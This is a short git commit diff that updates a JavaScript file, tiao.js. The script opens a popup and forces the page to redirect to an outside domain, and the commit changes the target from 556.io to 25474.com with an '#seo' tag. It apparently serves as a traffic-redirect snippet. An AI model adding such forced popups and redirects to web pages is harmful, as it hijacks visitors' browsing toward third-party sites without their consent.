1eb7ee9a939eaecedec44abc71180b778535e4f2
js999999999 <js-9@outlook.com>
2015-12-05 16:48:59 +0800

    Update tiao.js

--- qe2z/tiao.js
+++ qe2z/tiao.js
@@ -1,2 +1,3 @@
- window.open ("http://556.io/#cai-baidu"); 
- window.location.href="http://556.io/#cai-baidu"; 
+ window.open ("http://25474.com/#seo"); 
+ 
+ window.location.href="http://25474.com/#seo"; 
